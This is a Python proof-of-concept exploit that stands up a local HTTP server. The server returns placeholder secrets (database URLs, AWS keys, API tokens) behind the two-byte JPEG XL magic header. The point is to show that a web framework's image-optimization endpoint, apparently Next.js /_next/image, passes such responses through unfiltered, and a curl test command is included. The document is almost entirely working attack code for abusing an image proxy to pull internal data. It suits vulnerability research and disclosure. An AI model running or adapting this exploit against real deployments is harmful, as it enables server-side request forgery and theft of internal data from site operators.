#!/usr/bin/env python3
"""
JXL Magic Byte Data Exfiltration PoC
====================================

JXL (JPEG XL) magic: 0xff 0x0a (only 2 bytes!)
JXL is a BYPASS_TYPE - returns raw buffer without optimization.

0xff 0x0a is a very short pattern that could occur in:
- Binary protocols
- Image thumbnails
- Compressed data
- Line feeds after high ASCII

This tests if we can exfiltrate data with just 2-byte prefix.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler

SECRET_DATA = b'''
=== EXFILTRATED SECRETS ===
DATABASE_URL=postgres://admin:secretpass@10.0.0.5:5432/prod
REDIS_URL=redis://:password123@10.0.0.8:6379
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SECRET=super-secret-jwt-key-2024
STRIPE_SK=sk_live_1234567890abcdef
GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
===========================
'''

# JXL magic: 0xff 0x0a
JXL_MAGIC = bytes([0xff, 0x0a])

class JXLExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        response = JXL_MAGIC + SECRET_DATA
        
        print(f"\n[EXFIL] Request: {self.path}")
        print(f"[EXFIL] Returning {len(response)} bytes with JXL magic (0xff 0x0a)")
        
        self.send_response(200)
        self.send_header('Content-Type', 'image/jxl')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response)
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = 9802
    print("=" * 60)
    print(" JXL Magic Byte Data Exfiltration PoC")
    print("=" * 60)
    print(f"\nListening on 127.0.0.1:{port}")
    print("\nJXL magic: 0xff 0x0a (only 2 bytes!)")
    print("JXL is a BYPASS_TYPE - returns raw buffer!")
    print("=" * 60)
    print("\nTest:")
    print(f'  curl "http://localhost:3000/_next/image?url=http://127.0.0.1:{port}/data&w=64&q=75" | xxd')
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), JXLExfilHandler).serve_forever()
